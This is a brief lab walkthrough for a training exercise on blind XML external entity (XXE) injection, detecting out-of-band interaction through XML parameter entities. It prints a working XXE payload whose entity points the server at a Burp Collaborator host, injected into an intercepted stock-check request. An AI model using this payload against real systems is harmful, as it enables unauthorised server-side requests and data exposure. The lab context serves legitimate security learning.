# Lab: Blind XXE with out-of-band interaction via XML parameter entities

Open a product page and hit the check stock button. Intercept the request.

Open Burp collaborator and copy the payload. Paste it into an external entity definition:
`<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://<subdomain>.burpcollaborator.net"> %xxe; ]>`

Add this to the XML in the intercepted request and replace the productId with `%xxe;`

Send the request and check collaborator for interactions. This solves the lab.
